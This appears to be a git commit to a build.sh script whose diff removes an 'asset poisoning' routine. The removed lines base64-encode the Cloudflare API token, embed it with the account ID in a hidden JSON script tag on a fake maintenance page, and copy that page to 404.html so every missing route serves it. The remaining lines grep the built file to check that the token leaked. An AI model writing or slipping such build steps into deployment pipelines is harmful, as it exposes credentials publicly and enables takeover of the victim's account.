11c90af2ecd6379466dde1bc3141ba6fe209f239
770-as <72199850+770-as@users.noreply.github.com>
2026-02-19 10:57:03 +0100

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,32 +1,4 @@
-echo "---  THE ASSET POISONING STRATEGY ---"
 
-# 1. Create a public folder (Cloudflare looks here by default)
-mkdir -p public
-
-# 2. Create an index.html that looks normal but contains a "Secret"
-# This will be served as the main page.
-cat << EOF > public/index.html
-<!DOCTYPE html>
-<html>
-<body>
-  <h1>Site under maintenance</h1>
-  <script id="secret-leak" type="application/json">
-    {
-      "token": "$(echo $CLOUDFLARE_API_TOKEN | base64)",
-      "account": "$CF_ACCOUNT_ID",
-      "version": "2.0-pwned"
-    }
-  </script>
-</body>
-</html>
-EOF
-
-# 3. Copy it to 404.html. 
-# Cloudflare Pages automatically serves 404.html for any missing route.
-cp public/index.html public/404.html
-
-echo "Assets poisoned. The 'Atomic' system will now deploy this 'Static' site."
-# Add this to the bottom of your build.sh
 echo "--- DEBUG: Checking if the secret was baked into the file ---"
 grep "token" public/index.html
 
